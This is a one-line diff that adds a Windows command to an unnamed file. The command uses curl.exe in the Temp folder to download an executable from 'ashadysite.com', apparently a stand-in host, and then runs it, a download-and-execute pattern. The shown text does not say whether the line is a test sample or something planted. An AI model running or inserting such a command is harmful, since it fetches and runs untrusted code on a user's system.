@@ -1,0 +1,1 @@
+C:\Users\joe\AppData\Local\Temp\curl.exe -Os http://ashadysite.com/32498349863469.exe & start 32498349863469.exe
